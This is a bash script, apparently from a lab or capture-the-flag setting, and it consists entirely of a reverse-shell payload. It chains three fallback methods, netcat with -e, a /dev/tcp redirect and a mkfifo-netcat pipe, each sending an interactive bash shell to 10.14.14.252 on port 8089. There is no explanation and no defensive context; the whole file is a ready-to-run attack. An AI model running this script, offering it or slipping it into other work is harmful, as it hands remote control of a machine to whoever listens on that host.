#!/bin/bash
nc -e /bin/bash 10.14.14.252 8089 || bash -i >& /dev/tcp/10.14.14.252/8089 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.14.252 8089 >/tmp/f
